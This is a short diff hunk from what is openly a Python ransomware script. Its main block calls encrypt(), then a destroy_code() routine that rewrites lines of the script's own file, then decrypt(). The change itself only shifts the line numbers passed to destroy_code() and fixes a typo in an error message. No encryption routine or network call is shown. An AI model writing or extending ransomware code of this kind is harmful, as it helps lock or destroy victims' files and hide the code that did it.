@@ -74,11 +74,11 @@ if __name__ == "__main__":
 		ransomware = Ransomeware()
 		try:
 			ransomware.encrypt()
-			ransomware.destroy_code(sys.argv[0], 55, '\t\t"""\n')
-			ransomware.destroy_code(sys.argv[0], 62, '\t"""\n')
-			ransomware.destroy_code(sys.argv[0], 63, '\tpass\n')
+			ransomware.destroy_code(sys.argv[0], 61, '\t\t"""\n')
+			ransomware.destroy_code(sys.argv[0], 70, '\t"""\n')
+			ransomware.destroy_code(sys.argv[0], 71, '\tpass\n')
 			ransomware.decrypt()
 		except:
-			print("Sorry, an exception occurred.!")
+			print("Sorry, an exception occurred!")
 #			ransomeware.encrypt(path_to_folder=dirr)
 #			ransomeware.decrypt()
